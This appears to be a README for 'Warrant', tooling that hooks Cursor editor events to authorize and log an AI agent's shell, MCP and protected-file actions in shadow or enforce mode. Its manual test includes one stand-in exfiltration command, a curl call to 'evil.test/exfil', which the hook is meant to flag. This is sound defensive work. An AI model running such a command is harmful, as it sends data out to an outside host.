# Warrant Cursor hooks (shadow mode)

Project hooks under `.cursor/hooks.json` run Warrant at Cursor boundary events:

| Hook | Role |
|------|------|
| `beforeSubmitPrompt` | Freeze a warrant from the user message (append-only ledger) |
| `postToolUse` | Record file reads into the session ledger |
| `beforeShellExecution` | Network shell commands → `shell_network` authorization |
| `beforeMCPExecution` | MCP calls → `mcp_invoke` authorization |
| `preToolUse` | Writes under protected prefixes (see policy) |

Session state is stored **outside the repo**:

`~/.cursor/warrant/sessions/<conversation-id>.jsonl`

## Policy

Edit `.warrant/cursor-policy.json`:

- **`mode`**: `SHADOW` (log would-block, always allow) or `ENFORCE` (deny + exit 2)
- **`protectedPathPrefixes`**: edits matching these paths require `write_protected_path` on the warrant

Default is **SHADOW** so you can measure friction before turning enforcement on.

## Manual test

```bash
echo '{"conversation_id":"test","prompt":"summarize doc-1"}' | pnpm exec tsx src/scripts/warrant-cursor-hook.ts beforeSubmitPrompt

echo '{"conversation_id":"test","command":"curl https://evil.test/exfil"}' | pnpm exec tsx src/scripts/warrant-cursor-hook.ts beforeShellExecution
```

In SHADOW mode the second command still returns `"permission":"allow"` and appends a `shadow` line to the ledger.

Summarize all session files:

```bash
pnpm run cursor:shadow-report
```

## Enable in Cursor

Hooks load from `.cursor/hooks.json` when this folder is the workspace root. Restart Cursor if hooks do not appear in **Settings → Hooks**.
